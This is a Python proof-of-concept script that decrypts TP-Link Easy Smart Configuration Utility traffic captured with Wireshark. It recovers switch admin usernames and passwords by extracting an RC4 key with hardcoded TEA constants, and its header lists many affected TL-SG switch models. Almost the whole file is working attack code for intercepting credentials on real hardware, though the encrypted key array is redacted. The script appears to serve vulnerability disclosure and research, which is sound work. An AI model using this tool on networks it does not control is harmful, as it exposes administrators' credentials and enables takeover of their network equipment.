#!/usr/bin/env python3
# python 3.10.7
# --------------------------------------------------------------------------------------
# Easy Smart Configuration Utility packet decryption
# nad@geekly.dev
#
# Requires key obtained through decompiling the utility
#
# Expected data type for packet capture is string of hexadecimal string
#   Example included in raw.txt file
#   Contains login credentials of user:admin with password:EncryptFail
#   
#
# Raw hex string can be obtained through wireshark using "Follow UDP stream",
#   setting the output type to "Raw", and pasting into a text file.
#   Each line of raw.txt to contain one packet to be decrypted independently
# 
# Proof of concept performed on TL-SG105E v5, Build 20220414 Rel.50349
#
# Affected hardware includes the following:
# * TL-SG1428PE(UN) V1/V1.2/V1.26/V2/V2.2
# * TL-SG1218MPE(UN) V1/V2/V3.2/V3.26/V4/V4.2
# * TL-SG1210MPE V2/V3
# * TL-SG1024DE(UN) V1/V2/V3/V4/V4.2/V4.26
# * TL-SG1016PE(UN) V1/V2/V3.2/V3.26/V4/V5
# * TL-SG1016DE(UN) V1/V2/V3/V4/V4.2
# * TL-SG116E(UN) V1/V1.2/V2/V2.6
# * TL-SG105E(UN) V1/V2/V3/V4/V5
# * TL-SG108E(UN) V1/V2/V3/V4/V5/V6
# * TL-SG108PE(UN) V1/V2/V3/V4/V5
# * TL-SG105PE(UN) V1/V2
# * TL-RP108GE(UN) V1
# --------------------------------------------------------------------------------------


import ctypes


# --------------------------------------------------------------------------------------
# Tooling for data type conversions
# --------------------------------------------------------------------------------------
#
# Original java used signed byte arrays for datagram stream and ints 0-255 for key
# Since RC4 doesn't use bitwise operations, there's no need to account for endianness
# TEA groups 8 bytes into 2x 32bit ints; ctypes handles bit order


def from_signed(a):
    b = a & 0xFF
    return b


def to_signed(i, bits):
    if i & (1 << (bits - 1)):
        i -= 1 << bits
    return i


def mod_sign(i, m):
    x = from_signed(i) % m
    x = to_signed(x, 8)
    return (x)


def raw_to_bytelist(raw):
    bl = []
    bits = 8
    for i in range(0, len(raw), 2):
        value = int("0x" + raw[i:i+2], 16)
        if value & (1 << (bits - 1)):
            value -= 1 << bits
        bl.append(value)
    return (bl)


def text_to_bytelist(s):
    bl = []
    for char in s:
        bl.append(ord(char))
    return (bl)


def bytelist_to_string(bl):
    str_out = ""
    for x in range(len(bl)):
        str_out += chr(bl[x])
    return (str_out)


# Pack 8 bytes into 2 ints

def chunks(v, i):
    chunk = [0 for a in range(i >> 2)]
    y = 0
    for x in range(0, len(v), 4):
        chunk[y] = (v[x + 3]) | (v[x + 2] << 8) | (v[x + 1] << 16) | (v[x] << 24)
        y += 1
    return (chunk)


# Unpack 2 ints out to 8 bytes

def dechunks(v, i):
    chunk = [0 for a in range(i << 2)]
    y = 0
    for x in range(len(v)):
        chunk[y + 3] = v[x] & 0xFF
        chunk[y + 2] = v[x] >> 8 & 0xFF
        chunk[y + 1] = v[x] >> 16 & 0xFF
        chunk[y] = v[x] >> 24 & 0xFF
        y += 4
    return (chunk)


# --------------------------------------------------------------------------------------
# TEA and RC4 algorithms
# --------------------------------------------------------------------------------------

# TEA key decryption
# y, z, and sum require ctypes.c_int wrapping

def TEA_decrypt(v, k):
    
    # vector ints
    y = ctypes.c_int(v[0])
    z = ctypes.c_int(v[1])
    
    # TEA constants
    sum = ctypes.c_int(0xC6EF3720)
    delta = 0x9E3779B9

    for n in range(32, 0, -1):
        z.value -= (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]
        y.value -= (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        sum.value -= delta

    return [y.value, z.value]


# RC4 key scheduling algorithm
# S initial values set as list 0-255, not as null list with length of 256

def KSA(key):

    keylength = len(key)
    S = [x for x in range(256)]
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % keylength]) % 256
        S[i], S[j] = S[j], S[i]

    return S


# RC4 psuedo-random generation algorithm
# mod_sign manages the modulo between signed byte values vs 0-255 int values

def PRGA(S, data):

    i = 0
    j = 0
    out = []

    for x in range(len(data)):
        i = mod_sign((i + 1), 256)
        j = mod_sign((j + S[i]), 256)
        S[i], S[j] = S[j], S[i]
        K = S[mod_sign((S[i] + S[j]), 256)]
        out.append(data[x] ^ S[mod_sign((S[i] + S[j]), 256)])

    return (out)


# --------------------------------------------------------------------------------------
# Functions called by main() to decrypt key and packet data
# --------------------------------------------------------------------------------------

# TEA key extraction
# v: Unsign bytes from original signed byte array
# w: Sort into larger chunks, recursive list of 2 ints per chunk
# x: Send each chunk of 2 ints to be decrypted
# y: Separate chunks back out to individual bytes, flatten list recursion
# z: Strip first 8 values (unused offset), Unsign bytes once again and convert to UTF-8

def key_extract(key):

    # TEA key and vector
    k = [2023708229, -158607964, -2120859654, 1167043672]
    v = []

    for i in range(len(key)):
        v.append(from_signed(key[i]))

    w = []
    for i in range(0, len(v), 8):
        w.append(chunks(v[i:i+8], 8))
    if log == True:
        print("Sorted chunks for key extraction: \n", w)

    x = []
    for i in range(len(w)):
        x.append(TEA_decrypt(w[i], k))
    if log == True:
        print("Decrypted chunks: \n", x)

    y = []
    for i in range(len(x)):
        y.append(dechunks(x[i], 2))
    y = [item for sublist in y for item in sublist]
    if log == True:
        print("Decrypted bytes: \n", y)

    z = []
    for i in range(8, len(y)):
        z.append(from_signed(y[i]))
    return (bytelist_to_string(z))


# RC4 decryption
# Set data types
# Run key mutation
# Decrypt
# Encode to UTF-8

def RC4(key, data):

    key_bl = text_to_bytelist(key)
    if log:
        print("Key bytelist: \n", key)

    data_bl = raw_to_bytelist(data)
    if log:
        print("Raw bytelist: \n", data_bl)

    kS = KSA(key_bl)
    if log:
        print("KSA key: \n", kS)

    t = PRGA(kS, data_bl)
    if log:
        print("Output bytelist: \n", t)

    u = []
    for i in range(len(t)):
        u.append(from_signed(t[i]))
    if log:
        print("Un-signed bytelist: \n", u)

    out = bytelist_to_string(u)
    return (out)


# --------------------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------------------
# Optional: Enable logging for debugging
# Toggle key_ext to true if TEA key extraction is not already stored in key.txt
# Toggle key_print to true if you would like to display the key string

log = False
key_ext = True
key_print = True


# Read files or use built-in
# Key text file expected format is alphanumeric string
#   * Enable logging to display extracted string
#   * Can be pasted into a file to store
#   
# Packet capture expected format is raw hexadecimal
#   * Hex characters only, no escape characters or 0x
#   * One packet per line
#   * Can pull from wireshark using "follow UDP stream", view as "RAW" for hex values

def main():

    # To use built-in key extraction, define the value of key[] here
    # The encrypted byte array can be found in the decompiled source code of the utility
    # If decompiler fills certain values with "Byte.MAX_VALUE",
    #   replace with 127 (max value of signed byte)
    
    if key_ext == True:
        key_bl = [REDACTED]
        key = key_extract(key_bl)
        if key_print == True:
            print("Key string: \n", key)

    # Alternatively, a key stored as a string of alphanumeric values can be imported here
    
    else:
        with open("key.txt", "r") as f:
           lines = f.readlines()
           key = ""
           for line in lines:
              key += line.strip()
           f.close()


    # Load a packet capture file with expected format of RAW hex strings
    
    with open("raw.txt", "r") as g:
        packets = g.readlines()
        g.close()

    # Process each line from raw packet capture as individual packet and print results
    
    for packet in packets:
        raw = packet.strip()
        output = RC4(key, raw)
        print(output)
    
if __name__ == "__main__":
    main()